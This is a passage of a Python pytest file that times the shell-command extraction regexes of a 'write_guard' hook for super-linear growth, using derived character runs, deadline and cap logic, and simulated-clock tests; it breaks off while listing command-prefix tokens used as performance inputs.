# PowerShell body row's count of capped calls: a pattern here runs up to 46
# runs (the loop and piped removal patterns, read on the Windows box,
# 2026-11-09), and 46 runs of two windows of three big samples leave each about
# 181 ms of the 50 s budget, while the slowest linear small floor
# (`_GROWTH_SLOWEST_LINEAR_SMALL_S`) projects 63 ms -- a runner three times
# slower would red a linear pattern. What no projection bounds is the
# timeout's, as the alarm's late firing is the walker row's: a run's opening
# small sample (projected from nothing on its first window), a search past
# three times its projection (x192 between the two sizes, growth past about
# n^2.5 at the cap: a cubic, x512, whose small floor passes about 22 ms starts
# its big sample inside the deadline and ends past the timeout; or a stall
# that long), and a timeout lowered below the declared one
# (`PYTEST_TIMEOUT`, `--timeout`), which the deadline does not read. And what
# no ratio limit reads: growth between linear and quadratic, or a quadratic
# term under a larger linear one, reads under the limit, and is caught only
# where it crosses the ceiling arm above.
_GROWTH_SMALL_LEN = 2000
_GROWTH_BIG_LEN = 8 * _GROWTH_SMALL_LEN
_GROWTH_RATIO_LIMIT = 32.0  # 22 until the Windows box's cache knee read 21.3 (air's de2af4)
_GROWTH_JUDGED_FLOOR_S = 0.025
_GROWTH_SAMPLES = 3
#: A big sample's projected cost over its window's small floor: the growth of
#: a quadratic at `_GROWTH_BIG_LEN` over `_GROWTH_SMALL_LEN`.
_GROWTH_PROJECTION = (_GROWTH_BIG_LEN / _GROWTH_SMALL_LEN) ** 2
#: Room under pytest's per-test timeout past the row's deadline: for a search
#: that started inside the deadline and outruns its projection, and for the
#: row's work outside its searches (building the runs, the reading's text). The
#: searches themselves take about 0.11 s a pattern on the Windows box (the 221
#: patterns, both sizes, 24 to 26 s a pass, 2026-11-09).
_GROWTH_BUDGET_MARGIN_S = 10.0
#: The most a big sample may be projected to cost: half the margin, so a search
#: that starts at the deadline's edge and runs three times its projection still
#: ends inside the timeout. A small floor past this over `_GROWTH_PROJECTION`
#: (78 ms at 2000 chars, eighty times the slowest linear floor) is never asked
#: the big size.
_GROWTH_SEARCH_CAP_S = _GROWTH_BUDGET_MARGIN_S / 2
#: The slowest linear small floor in the population, the cause rule's yardstick
#: and the false-red row's: `_PS_TRUNCATE_RE` on the run `x=1;`, 0.98 ms, three
#: samples, Windows 3.11.9 on the self-host Windows box, 2026-11-09.
_GROWTH_SLOWEST_LINEAR_SMALL_S = 0.00098

#: The characters a derived run is made of: the first of these a repeated
#: class accepts is its run. Shell-shaped on purpose -- the extraction modules
#: read commands -- with a letter, a digit and `_` first.
_RUN_ALPHABET = " a0_/-=.'\"\\;|&$(){}[]<>*?:,@#%+!~`\tZ9\n"


def _repeated_single_classes(pattern: "re.Pattern[str]") -> list[tuple[int, object]]:
    """Every repeat in ``pattern`` whose body is one character class (a
    literal, a set, a category, ``.``), as its parsed ``(op, argument)``, in
    the order the parse walks them; nested repeats included."""
    from re import _parser as sre_parse

    repeats = {sre_parse.MAX_REPEAT, sre_parse.MIN_REPEAT}
    if hasattr(sre_parse, "POSSESSIVE_REPEAT"):
        repeats.add(sre_parse.POSSESSIVE_REPEAT)
    one_char = {sre_parse.LITERAL, sre_parse.NOT_LITERAL, sre_parse.IN, sre_parse.ANY, sre_parse.CATEGORY}
    found: list[tuple[int, object]] = []

    def walk(seq) -> None:
        for op, av in seq:
            if op in repeats:
                body = av[2]
                if len(body) == 1 and body[0][0] in one_char:
                    found.append(body[0])
                walk(body)
            elif op is sre_parse.SUBPATTERN:
                walk(av[-1])
            elif op is sre_parse.BRANCH:
                for branch in av[1]:
                    walk(branch)
            elif op in (sre_parse.ASSERT, sre_parse.ASSERT_NOT):
                walk(av[1])
            elif op is getattr(sre_parse, "ATOMIC_GROUP", None):
                walk(av)
            elif op is sre_parse.GROUPREF_EXISTS:
                walk(av[1])
                if av[2] is not None:
                    walk(av[2])

    walk(sre_parse.parse(pattern.pattern, pattern.flags))
    return found


def _derived_run_units(pattern: "re.Pattern[str]") -> list[str]:
    """One character per repeated single-character class in ``pattern``, in
    parse order: the first of `_RUN_ALPHABET` the class accepts that no
    earlier class took, so two classes that both take letters and digits
    bring a run of each. The class is compiled alone, so its flags (case,
    dot-all) hold."""
    from re import _compiler as sre_compile
    from re import _parser as sre_parse

    units: list[str] = []
    for node in _repeated_single_classes(pattern):
        state = sre_parse.State()
        state.flags = pattern.flags
        alone = sre_compile.compile(sre_parse.SubPattern(state, [node]), pattern.flags)
        unit = next((ch for ch in _RUN_ALPHABET if ch not in units and alone.fullmatch(ch)), None)
        if unit is not None:
            units.append(unit)
    return units


def _run_of(unit: str, length: int) -> str:
    """``unit`` repeated to exactly ``length`` characters."""
    return (unit * (length // len(unit) + 1))[:length]


#: The hand list as run units, for the growth arm's two sizes.
_ADVERSARIAL_UNITS: list[tuple[str, str]] = [
    ("space-run", " "), ("word-run", "a"), ("path-run", "a/"), ("env-assign-run", "A=1 "),
    ("assign-separator-run", "x=1;"), ("wrapper-run", "sudo -u me "), ("flag-run", "-a "),
    ("quote-run", "'"),
]


def _growth_row_budget_s(timeout_s: float) -> float | None:
    """The growth row's time for one pattern inside pytest's per-test
    ``timeout_s``: `_GROWTH_BUDGET_MARGIN_S` under it. None with no timeout.
    It reads the declared timeout, as :func:`_walker_row_budget_s` does."""
    if timeout_s <= 0:
        return None
    return timeout_s - _GROWTH_BUDGET_MARGIN_S


#: The growth row's clock for its deadline; the simulated-clock rows replace it.
_growth_clock = time.perf_counter


def _growth_deadline() -> float | None:
    """When the growth row stops starting searches: now plus its budget."""
    budget_s = _growth_row_budget_s(_pyproject_timeout_s())
    return None if budget_s is None else _growth_clock() + budget_s


class _GrowthBudgetSpent(Exception):
    """A search was not started: its projection would end past the row's
    deadline, or a big sample's would pass `_GROWTH_SEARCH_CAP_S`. ``where``
    names it and which; ``smalls`` and ``bigs`` are the samples its window had
    taken."""

    def __init__(self, where: str):
        super().__init__(where)
        self.where = where
        self.smalls: list[float] = []
        self.bigs: list[float] = []


def _growth_search_s(pattern: "re.Pattern[str]", payload: str) -> float:
    """One unalarmed search, timed; the simulated-clock rows replace it.
    Called through :func:`_growth_timed` alone."""
    t0 = time.perf_counter()
    pattern.search(payload)
    return time.perf_counter() - t0


def _growth_timed(
    pattern: "re.Pattern[str]", payload: str, projected_s: float, deadline: float | None,
    cap_s: float | None = None,
) -> float:
    """The arm's one way to search: one projected past ``cap_s``, or that,
    costing ``projected_s``, would end past ``deadline``, is not started
    (DEF-5023's stop check, the projection where the walker row's alarm
    ceiling stands)."""
    asked = f"a search of {len(payload)} chars projected at {projected_s * 1000:.0f}ms"
    if cap_s is not None and projected_s > cap_s:
        raise _GrowthBudgetSpent(f"{asked}, past the {cap_s * 1000:.0f}ms cap on one search")
    if deadline is not None and _growth_clock() + projected_s > deadline:
        raise _GrowthBudgetSpent(f"{asked}, past the row's deadline")
    return _growth_search_s(pattern, payload)


def _growth_window_time(
    pattern: "re.Pattern[str]", small: str, big: str, deadline: float | None,
    prior_small_s: float = 0.0,
) -> tuple[float, float]:
    """One window: ``(small_s, big_s)``, each size's floor. A small sample
    opens it, projected from ``prior_small_s`` (the run's earlier floor, none
    for its first window); then `_GROWTH_SAMPLES` pairs interleave, small then
    big (DEF-2000's order), each big projected from the floor of the smalls
    taken so far -- two at least, so one stalled sample never sets it -- and
    capped. A small sample carries no cap, only the deadline: it is the size a
    pattern is read at first, and a projection from the run's earlier floor
    says nothing of a stall. A stop carries the samples taken."""
    smalls: list[float] = []
    bigs: list[float] = []
    try:
        smalls.append(_growth_timed(pattern, small, prior_small_s, deadline))
        for _ in range(_GROWTH_SAMPLES):
            smalls.append(_growth_timed(pattern, small, min(smalls), deadline))
            bigs.append(_growth_timed(pattern, big, min(smalls) * _GROWTH_PROJECTION, deadline,
                                      cap_s=_GROWTH_SEARCH_CAP_S))
    except _GrowthBudgetSpent as spent:
        spent.smalls, spent.bigs = smalls, bigs
        raise
    return min(smalls), min(bigs)


def _grows_past_linear(small_s: float, big_s: float) -> bool:
    """The rule: judged only above the floor, red past the limit."""
    return big_s > _GROWTH_JUDGED_FLOOR_S and big_s > _GROWTH_RATIO_LIMIT * small_s


def _growth_reading(small_s: float, big_s: float, windows: str) -> str:
    """A window's readings as a sentence, red or not."""
    ratio = f"{big_s / small_s:.1f}" if small_s > 0 else "unbounded"
    return (
        f"{small_s * 1000:.1f}ms at {_GROWTH_SMALL_LEN} chars -> {big_s * 1000:.1f}ms at "
        f"{_GROWTH_BIG_LEN} (ratio {ratio}, limit {_GROWTH_RATIO_LIMIT}, judged above "
        f"{_GROWTH_JUDGED_FLOOR_S * 1000:.0f}ms), {windows}"
    )


def _growth_judgement(
    pattern: "re.Pattern[str]", unit: str, deadline: float | None,
) -> tuple[bool, str]:
    """``(red, reading)`` for a run of ``unit``: red past the limit above the
    floor. A pair over the limit is asked again, and the lower ratio is the
    estimate; where the deadline or the cap leaves no room for the second
    window, the first stands, and the reading says so. A first window that is
    stopped raises `_GrowthBudgetSpent` to the row."""
    small, big = _run_of(unit, _GROWTH_SMALL_LEN), _run_of(unit, _GROWTH_BIG_LEN)
    first = _growth_window_time(pattern, small, big, deadline)
    if not _grows_past_linear(*first):
        return False, _growth_reading(*first, "one window")
    try:
        second = _growth_window_time(pattern, small, big, deadline, first[0])
    except _GrowthBudgetSpent as spent:
        return True, _growth_reading(*first, f"one window; the second stopped ({spent.where})")
    lower = second if second[1] * first[0] < first[1] * second[0] else first
    return _grows_past_linear(*lower), _growth_reading(*lower, "two windows, the lower ratio")


def _growth_units(pattern: "re.Pattern[str]") -> list[tuple[str, str]]:
    """The runs a pattern is read on: the hand list, then its derived runs."""
    return [*_ADVERSARIAL_UNITS, *((f"derived-run {u!r}", u) for u in _derived_run_units(pattern))]


def _growth_stop_red(shape: str, spent: _GrowthBudgetSpent, read: int, not_reached: list[str]) -> str:
    """The red for a run the deadline or the cap stopped on its first window:
    the run, what stopped it, the samples taken, the runs not reached, and the
    cause the readings point to (air's 1ea8f4 follow-up, ef1b48) -- a regressed
    pattern where the window in flight reads past the limit, or where two
    small samples at least, and no big one, put its small floor past ten times
    the slowest linear one (the wall-clock rule's multiple); else a slow host:
    every reading linear, or one small sample, which a stall reads the same as
    a slow pattern (air's d98e83 (A))."""
    taken = (f"small {', '.join(f'{s * 1000:.1f}' for s in spent.smalls) or 'none'} ms, "
             f"big {', '.join(f'{b * 1000:.1f}' for b in spent.bigs) or 'none'} ms")
    floor = min(spent.smalls) if spent.smalls else 0.0
    if spent.bigs and _grows_past_linear(floor, min(spent.bigs)):
        cause = "the window in flight reads past the limit: a regressed pattern"
    elif len(spent.smalls) >= 2 and not spent.bigs and floor > 10 * _GROWTH_SLOWEST_LINEAR_SMALL_S:
        cause = (f"its small floor is {floor / _GROWTH_SLOWEST_LINEAR_SMALL_S:.0f} times the slowest "
                 f"linear one ({_GROWTH_SLOWEST_LINEAR_SMALL_S * 1000:.2f}ms on the Windows box): a "
                 f"regressed pattern, unless this host is that much slower")
    elif len(spent.smalls) < 2:
        cause = (f"{len(spent.smalls)} small sample taken, too few to read the pattern by, and a stall "
                 f"reads the same ({read} runs read before it): a slow host")
    else:
        cause = f"every reading is linear ({read} runs read before it, and the window in flight): a slow host"
    return (f"{shape}: not read, its first window stopped at {spent.where}; samples taken: {taken}; "
            f"{len(not_reached)} runs not reached ({', '.join(not_reached) or 'none'}); {cause}")


def _growth_first_red(
    pattern: "re.Pattern[str]", units: list[tuple[str, str]], deadline: float | None,
) -> str | None:
    """The row's walk: each run in order, ending at the first that reads
    super-linear (the pattern is red, and the runs after it would only spend
    the budget) or at a stop, which is a red naming what was read
    (:func:`_growth_stop_red`)."""
    for read, (shape, unit) in enumerate(units):
        try:
            red, reading = _growth_judgement(pattern, unit, deadline)
        except _GrowthBudgetSpent as spent:
            return _growth_stop_red(shape, spent, read, [later for later, _ in units[read + 1:]])
        if red:
            return f"{shape}: {reading}"
    return None


@pytest.mark.parametrize("name,pattern", _DERIVED_REGEXES + _FIRST_USE_REGEXES)
def test_every_derived_regex_grows_linearly_without_an_alarm(name, pattern):
    """The shape detector every platform runs: it times `.search` of each
    derived regex on every hand and derived run at 2000 and 16000 chars and
    reds on growth past linear, or on a run its deadline or cap leaves unread.
    Self-enrolling like the ceiling arm; no skip anywhere."""
    red = _growth_first_red(pattern, _growth_units(pattern), _growth_deadline())
    assert red is None, (
        f"{name} is not read:\n  {red}" if ": not read," in str(red) else
        f"{name} grows past linear -- a greedy run that can restart at every "
        f"position of the run is quadratic by construction; refuse a start inside "
        f"the run with a leading lookbehind (write_guard._CASE_ARM_RE) when every "
        f"caller .match()es at the start, or bound the token class:\n  {red}"
    )


#: The four patterns #543 fixed, as they were before the fix (each one's
#: leading lookbehind stripped), with the run each reads quadratic on. Three
#: of the four runs are not in the hand list: only the derivation brings them.
_PRE_543_PATTERNS: list[tuple[str, str, str]] = [
    ("_INPUT_REDIRECT_RE", r"[0-9]*<(?![<>&(])", "0"),
    ("_OUTPUT_REDIRECT_RE", r"[0-9]*>>?\|?", "0"),
    ("_ASSIGNMENT_WORD_RE", r"[A-Za-z_][A-Za-z0-9_]*=", "a"),
    ("_CASE_ARM_RE", r"(?:(?:function[ \t]+)?[A-Za-z_][\w.:-]*[ \t]*\(\)"
                     r"|\(?(?:\"[^\"\n]*\"|'[^'\n]*'|[^\s;|&()<>\"'])+\))[ \t]*", "0"),
]


@pytest.mark.parametrize("name,source,unit", _PRE_543_PATTERNS, ids=[p[0] for p in _PRE_543_PATTERNS])
def test_the_derivation_brings_the_run_each_pre_543_pattern_was_quadratic_on(name, source, unit):
    """The derivation's must-find rows, read without a clock: each pattern
    #543 fixed, as it was, derives the run it was quadratic on. Red here
    means the parse walk lost a repeat form or the class compile broke on
    this interpreter, and every derived shape above went with it."""
    assert unit in _derived_run_units(re.compile(source)), (name, _derived_run_units(re.compile(source)))


def test_the_derived_runs_reach_past_the_hand_list():
    """Non-vacuity, both ways: most of the population derives a run, and the
    population's runs include characters no hand shape is made of (the digit
    run is the one #543 was missing)."""
    hand = set("".join(unit for _, unit in _ADVERSARIAL_UNITS))
    units_by_name = {name: _derived_run_units(pattern) for name, pattern in _DERIVED_REGEXES}
    with_a_run = [name for name, units in units_by_name.items() if units]
    assert len(with_a_run) * 2 > len(_DERIVED_REGEXES), (len(with_a_run), len(_DERIVED_REGEXES))
    beyond = set().union(*map(set, units_by_name.values())) - hand
    assert "0" in beyond, sorted(beyond)


@pytest.mark.parametrize("name,source,unit", _PRE_543_PATTERNS[:3], ids=[p[0] for p in _PRE_543_PATTERNS[:3]])
def test_the_growth_arm_reds_the_pre_543_patterns(name, source, unit):
    """The arm's must-trip rows: each fixed pattern as it was reads past the
    limit on its run, on any platform. `_CASE_ARM_RE` is left out of the
    timing only for its cost (about 6 s a big sample at 16000 chars on the
    Windows box, two windows of six); its derivation row above stands. The
    reading rides the assertion, so a miss says whether the floor or the
    limit let the pattern through (#547's first 3.11 cell could not)."""
    try:
        red, reading = _growth_judgement(re.compile(source), unit, _growth_deadline())
    except _GrowthBudgetSpent as spent:
        pytest.fail(f"{name}: not read, {spent.where}")
    assert red, f"{name}: {reading}"


def test_the_growth_arm_passes_the_same_patterns_fixed():
    """The polarity row: the live, fixed patterns read linear on the same
    runs, so the trips above are the shape, not the arm."""
    import write_guard as _wg

    deadline = _growth_deadline()
    for name, _source, unit in _PRE_543_PATTERNS:
        try:
            red, reading = _growth_judgement(getattr(_wg, name), unit, deadline)
        except _GrowthBudgetSpent as spent:
            pytest.fail(f"{name}: not read, {spent.where}")
        assert not red, f"{name}: {reading}"


# ── the growth arm's deadline, on a simulated clock (air's 1ea8f4 on #547) ──


def _growth_simulation(
    monkeypatch: pytest.MonkeyPatch, cost: Callable[[int, int], float],
) -> tuple[list[tuple[int, float, float]], list[float]]:
    """Replace the growth row's clock and timer with a simulated clock:
    ``cost(length, call_index)`` seconds a search, each search moving the
    clock by its cost. Records ``(length, start, end)`` a search, and returns
    the record and the clock's cell."""
    now = [0.0]
    calls: list[tuple[int, float, float]] = []

    def search_s(_pattern: object, payload: str) -> float:
        spent = cost(len(payload), len(calls))
        calls.append((len(payload), now[0], now[0] + spent))
        now[0] += spent
        return spent

    monkeypatch.setattr(sys.modules[__name__], "_growth_clock", lambda: now[0])
    monkeypatch.setattr(sys.modules[__name__], "_growth_search_s", search_s)
    return calls, now


#: A window's searches: its opening small sample, then a small and a big a pair.
_GROWTH_WINDOW_CALLS = 1 + 2 * _GROWTH_SAMPLES


def _longest_growth_population() -> tuple[str, "re.Pattern[str]"]:
    """The derived pattern with the most runs, read, never copied."""
    return max(_DERIVED_REGEXES, key=lambda named: len(_growth_units(named[1])))


@pytest.mark.parametrize("overrun", [1.0, 2.9], ids=["on-projection", "2.9x-projection"])
def test_the_growth_arm_cannot_outlast_the_per_test_timeout(monkeypatch, overrun):
    """Air's amendment (1) on #547: no alarm caps the growth arm's searches,
    so the row's longest path -- every run of the population's longest pattern
    reading over the limit on its first window and under on its second, so
    every run takes two, each big sample projected at the cap -- is driven on a
    simulated clock and must stop with a red that names what was read, never
    outlast the timeout. On its projection every search but a run's unprojected
    opener ends by the deadline; at 2.9 times it (the failure-mode review's
    overrun: growth past quadratic, a stall) the margin holds the overrun,
    since the cap is half of it. The timeout is derived from pyproject.toml
    (:func:`_pyproject_timeout_s`)."""
    timeout_s = _pyproject_timeout_s()
    budget_s = _growth_row_budget_s(timeout_s)
    assert budget_s is not None and 0 < budget_s < timeout_s, (budget_s, timeout_s)
    assert _growth_row_budget_s(0.0) is None  # no timeout, nothing kills the row
    assert 2 * _GROWTH_SEARCH_CAP_S <= _GROWTH_BUDGET_MARGIN_S  # three times the cap ends inside the timeout
    small_s = _GROWTH_SEARCH_CAP_S / _GROWTH_PROJECTION  # a big sample projected at the cap exactly

    def cost(length: int, index: int) -> float:
        if length == _GROWTH_SMALL_LEN:
            return small_s
        over = (index // _GROWTH_WINDOW_CALLS) % 2 == 0  # a run's first window
        return overrun * small_s * (_GROWTH_PROJECTION if over else 8.0)

    calls, now = _growth_simulation(monkeypatch, cost)
    name, pattern = _longest_growth_population()
    units = _growth_units(pattern)
    red = _growth_first_red(pattern, units, _growth_deadline())
    # stopped on a first window, a stop red; on a second, the first window's growth red
    assert red is not None and "past the row's deadline" in red, red
    assert ("runs not reached" in red and "samples taken" in red) if ": not read," in red else (
        "the second stopped" in red), red
    if overrun == 1.0:
        assert len(calls) > 2 * _GROWTH_WINDOW_CALLS, (name, len(calls))  # runs were read before the stop
        openers = set(range(0, len(calls), 2 * _GROWTH_WINDOW_CALLS))  # each run's first window opens unprojected
        late = [(i, c) for i, c in enumerate(calls) if c[2] > budget_s and i not in openers]
        assert not late, late
    assert now[0] < timeout_s, (now[0], timeout_s)


def test_the_longest_pattern_reads_linear_inside_the_budget_at_ten_times_the_slowest_floor(monkeypatch):
    """The false-red side (the failure-mode review): the population's longest
    pattern, every run linear at ten times the slowest linear small floor (the
    wall-clock rule's multiple: a runner that much slower), reads linear with
    no stop. More runs, more samples or a bigger size would red here first,
    naming the budget, rather than as linear patterns 'not read' on a slow
    cell."""
    small_s = 10 * _GROWTH_SLOWEST_LINEAR_SMALL_S

    def cost(length: int, _index: int) -> float:
        return small_s if length == _GROWTH_SMALL_LEN else 8.0 * small_s

    _calls, now = _growth_simulation(monkeypatch, cost)
    name, pattern = _longest_growth_population()
    assert _growth_first_red(pattern, _growth_units(pattern), _growth_deadline()) is None, name
    budget_s = _growth_row_budget_s(_pyproject_timeout_s())
    assert budget_s is not None and now[0] < budget_s / 2, (name, now[0], budget_s)


def test_the_growth_arm_reads_a_quadratic_red_on_one_window_when_the_deadline_cuts_its_second(monkeypatch):
    """A quadratic whose first window fits and whose second does not reads red
    on the first window, says so, and spends no search past the deadline."""
    small_s = 0.07

    def cost(length: int, _index: int) -> float:
        return small_s if length == _GROWTH_SMALL_LEN else small_s * _GROWTH_PROJECTION

    calls, now = _growth_simulation(monkeypatch, cost)
    # window 1 ends at 13.72 s; the second's first big, projected 4.48 s from 13.86 s, would end past 17
    red = _growth_first_red(re.compile("x"), [("word-run", "a"), ("space-run", " ")], 17.0)
    assert red is not None and red.startswith("word-run:") and "the second stopped" in red, red
    assert sum(1 for length, _, _ in calls if length == _GROWTH_BIG_LEN) == _GROWTH_SAMPLES, calls
    assert now[0] <= 17.0, now[0]


@pytest.mark.parametrize("over", [True, False], ids=["past-the-cap", "at-the-cap"])
def test_the_growth_arm_asks_the_big_size_only_within_the_cap(monkeypatch, over):
    """A small floor whose projection passes `_GROWTH_SEARCH_CAP_S` is never
    asked the big size -- the pre-#543 `_CASE_ARM_RE` at the Mac's 227 ms is
    four times past it -- and the red says so, with the regressed-pattern
    cause; one at the cap is asked."""
    small_s = _GROWTH_SEARCH_CAP_S / _GROWTH_PROJECTION * (1.01 if over else 1.0)

    def cost(length: int, _index: int) -> float:
        return small_s if length == _GROWTH_SMALL_LEN else 8.0 * small_s

    calls, _now = _growth_simulation(monkeypatch, cost)
    red = _growth_first_red(re.compile("x"), [("word-run", "a")], _growth_deadline())
    if over:
        assert red is not None and "cap on one search" in red and "a regressed pattern, unless" in red, red
        assert [length for length, _, _ in calls] == [_GROWTH_SMALL_LEN] * 2, calls
    else:
        assert red is None, red
        assert sum(1 for length, _, _ in calls if length == _GROWTH_BIG_LEN) == _GROWTH_SAMPLES, calls


@pytest.mark.parametrize("readings", ["linear", "past-the-limit"])
def test_a_stopped_run_names_the_cause_its_readings_point_to(monkeypatch, readings):
    """Air's ef1b48 (b): a deadline red names the run in flight, the samples
    taken and the runs not reached, and reads a slow host apart from a
    regressed pattern -- linear readings at a small floor under ten times the
    slowest linear one point to the host, a window in flight past the limit to
    the pattern."""
    # linear: a run takes 0.252 s, and each big must fit its 576 ms projection, so a 1.05 s deadline
    # reads two runs and stops the third before its first big; past the limit: one big read, then stopped
    small_s, big_s, deadline = (0.009, 0.072, 1.05) if readings == "linear" else (0.004, 0.256, 0.3)

    def cost(length: int, _index: int) -> float:
        return small_s if length == _GROWTH_SMALL_LEN else big_s

    _growth_simulation(monkeypatch, cost)
    units = [("word-run", "a"), ("space-run", " "), ("path-run", "a/"), ("quote-run", "'")]
    red = _growth_first_red(re.compile("x"), units, deadline)
    assert red is not None and ": not read," in red and "past the row's deadline" in red, red
    if readings == "linear":
        assert red.startswith("path-run:") and "1 runs not reached (quote-run)" in red, red
        assert "small 9.0, 9.0 ms, big none ms" in red and "a slow host" in red, red
    else:
        assert red.startswith("word-run:") and "3 runs not reached" in red, red
        assert "big 256.0 ms" in red and "past the limit: a regressed pattern" in red, red


def test_a_stop_on_one_small_sample_names_a_slow_host(monkeypatch):
    """Air's d98e83 (A): an opening small sample that stalls 11 s puts the
    next small's projection (that one sample) past the deadline. One sample
    is too few to read the pattern by, so the red names a slow host, never a
    regressed pattern; two smalls and no big are the floor-multiple branch's."""
    def cost(length: int, index: int) -> float:
        return 11.0 if index == 0 else 0.004

    calls, _now = _growth_simulation(monkeypatch, cost)
    red = _growth_first_red(re.compile("x"), [("word-run", "a"), ("space-run", " ")], 20.0)
    assert red is not None and red.startswith("word-run: not read,"), red
    assert "small 11000.0 ms, big none ms" in red and "1 small sample taken" in red, red
    assert "a slow host" in red and "regressed" not in red, red
    assert len(calls) == 1, calls


def test_a_stop_after_a_linear_big_sample_names_a_slow_host(monkeypatch):
    """Air's d98e83 (A), its other half: a window that read a big sample
    linear (ratio 8 above the judged floor) is a slow host's, however far its
    small floor is past the slowest linear one -- here 51 times. Two smalls and
    a big read, then the second big's 3.2 s projection crosses the deadline."""
    def cost(length: int, _index: int) -> float:
        return 0.05 if length == _GROWTH_SMALL_LEN else 0.4

    _growth_simulation(monkeypatch, cost)
    red = _growth_first_red(re.compile("x"), [("word-run", "a")], 3.5)
    assert red is not None and "small 50.0, 50.0, 50.0 ms, big 400.0 ms" in red, red
    assert "every reading is linear" in red and "a slow host" in red and "regressed" not in red, red


def test_one_stalled_small_sample_does_not_red_a_linear_run(monkeypatch):
    """The projection is the floor of two small samples at least, never one:
    a run whose opening small sample stalls for 5 s and whose others read
    linear is asked the big size, read linear, on one window."""
    def cost(length: int, index: int) -> float:
        if index == 0:
            return 5.0
        return 0.004 if length == _GROWTH_SMALL_LEN else 0.032

    calls, _now = _growth_simulation(monkeypatch, cost)
    assert _growth_first_red(re.compile("x"), [("word-run", "a")], _growth_deadline()) is None
    assert sum(1 for length, _, _ in calls if length == _GROWTH_BIG_LEN) == _GROWTH_SAMPLES, calls


def test_the_growth_arm_stops_a_pattern_at_its_first_super_linear_run(monkeypatch):
    """Air's amendment (1): one super-linear run is the pattern's verdict, so
    the runs after it are never read -- two windows of the first, nothing more."""
    def cost(length: int, _index: int) -> float:
        return 0.002 if length == _GROWTH_SMALL_LEN else 0.002 * _GROWTH_PROJECTION

    calls, _now = _growth_simulation(monkeypatch, cost)
    red = _growth_first_red(re.compile("x"), [("word-run", "a"), ("space-run", " ")], _growth_deadline())
    assert red is not None and red.startswith("word-run:") and "two windows" in red, red
    assert len(calls) == 2 * _GROWTH_WINDOW_CALLS, calls


#: The rows that run the growth arm on real patterns, the structure read's roots.
_GROWTH_ROOTS = (
    "test_every_derived_regex_grows_linearly_without_an_alarm",
    "test_the_growth_arm_reds_the_pre_543_patterns",
    "test_the_growth_arm_passes_the_same_patterns_fixed",
)
#: Every method of a compiled pattern that scans a string.
_PATTERN_SCANS = frozenset({"search", "match", "fullmatch", "finditer", "findall", "sub", "subn", "split", "scanner"})


def test_the_growth_arm_searches_only_through_its_stop_check():
    """The structure read, as the PowerShell body row reads its verdict, over
    every module function the real rows reach (the call graph from
    `_GROWTH_ROOTS`, not a name filter): a pattern scans a string only in
    `_growth_search_s`, which only `_growth_timed` calls, after its clock check;
    every `_growth_timed` call passes the deadline it was given; and each root
    reads `_growth_deadline()`, so a path the simulated rows do not reach
    cannot search unchecked. `_derived_run_units` is set apart and not walked:
    it matches one character against one class, never a run."""
    module = ast.parse(Path(__file__).read_text(encoding="utf-8"))
    defs = {node.name: node for node in module.body if isinstance(node, ast.FunctionDef)}

    def named_calls(node: ast.AST) -> list[ast.Call]:
        return [c for c in ast.walk(node) if isinstance(c, ast.Call) and isinstance(c.func, ast.Name)]

    derivation = "_derived_run_units"
    reached: set[str] = set()
    todo = list(_GROWTH_ROOTS)
    while todo:
        name = todo.pop()
        if name in reached or name not in defs:
            continue
        reached.add(name)
        if name != derivation:
            todo += [c.func.id for c in named_calls(defs[name])]  # type: ignore[union-attr]
    assert {"_growth_timed", "_growth_search_s", "_growth_window_time", "_growth_judgement",
            "_growth_first_red", "_growth_stop_red", derivation} <= reached, sorted(reached)
    for name in sorted(reached - {derivation}):
        calls = [c for c in ast.walk(defs[name]) if isinstance(c, ast.Call)]
        scans = [c.lineno for c in calls if isinstance(c.func, ast.Attribute) and c.func.attr in _PATTERN_SCANS]
        timers = [c.lineno for c in named_calls(defs[name]) if c.func.id == "_growth_search_s"]  # type: ignore[union-attr]
        if name == "_growth_search_s":
            assert len(scans) == 1, scans
            continue
        assert not scans, (name, scans)
        assert not timers or name == "_growth_timed", (name, timers)
        for call in named_calls(defs[name]):
            if call.func.id == "_growth_timed":  # type: ignore[union-attr]
                assert isinstance(call.args[3], ast.Name) and call.args[3].id == "deadline", (name, call.lineno)
    for root in _GROWTH_ROOTS:
        assert "_growth_deadline" in {c.func.id for c in named_calls(defs[root])}, root  # type: ignore[union-attr]
    line = {c.func.id: c.lineno for c in named_calls(defs["_growth_timed"])}  # type: ignore[union-attr]
    assert line["_growth_clock"] < line["_growth_search_s"], line  # the check, then the search


# ── _CMD_POS prefix-run budget ────────────────────────────────────────────────
#
# The command-position fragment sits in front of THIRTEEN write_guard extraction
# regexes on the PreToolUse path, so a super-linear shape in it is a hang on
# every tool call — and a hang is NOT caught by write_guard's `except
# BaseException` crash guard, which only sees exceptions. The population above
# never exercised a repeated PREFIX run (it varies the quoted body), which is
# why this shape survived: `_CMD_POS_EXEC_QUOTE` carried `[ \t]*[\"']?[ \t]*`,
# two adjacent whitespace runs split by an optional quote, so each `eval ` could
# be partitioned two ways and `(?:…)*` explored 2^n of them on a failing match.
#
# Every prefix token that `_CMD_POS` admits is driven, not just the one that
# blew up, so a future widening of any arm is budgeted by construction.
def _prefix_run_tokens() -> list[str]:
    """DERIVED from `_CMD_POS`'s own arms, not hand-listed.

    ⚠ A hand-written list is what let this gate overclaim. Its first version
    named six tokens and its docstring said "every prefix token `_CMD_POS`
    admits is driven" — but it omitted the wrapper-WITH-FLAG-ARGUMENT spelling,
    and `env -i ` / `nice -n 10 ` / `xargs -0 ` / `strace -f ` were all still
    exponential (>5000 ms at 30 repetitions) while the gate reported green.
    Deriving the population means a wrapper added to `_CMD_POS_WRAPPER` later is
    budgeted without anyone remembering to enrol it.
    """
    import re as _re
    import _bash_patterns

    wrappers = _re.findall(r"[a-z]+", _bash_patterns._CMD_POS_WRAPPER)
    keywords = _re.findall(r"[a-z]+", _bash_patterns._CMD_POS_KEYWORD)
    tokens = ["eval ", "sh -c ", "A=1 ", "> f "]
    # the INNER length of a redirect target, not only the repetition count:
    # the DEF-794 gate hung on one thirty-character bare target while every
    # row here repeated a four-character one (both reviews, driven)
    tokens += [">" + "a" * n + " " for n in (30, 64, 512)]
    tokens += ['>"' + "a b" * 8 + '" ', "> " + "a" * 64 + " "]
    # DEF-848's lane: one assignment prefix per piece the value arm admits --
    # single, double and ANSI-C quotes holding a blank, a backslash escape, a
    # lone `$`, a separator inside a quote -- and the three quote openers left
    # unterminated, the failing shape for a quoted piece
    tokens += ["A='a b' ", 'A="a b" ', "A=$'a b' ", "A=a\\ b ", "A=$x ", "A='a;b' "]
    tokens += ["A='", 'A="', "A=$'"]
    tokens += [f"{w} " for w in wrappers]
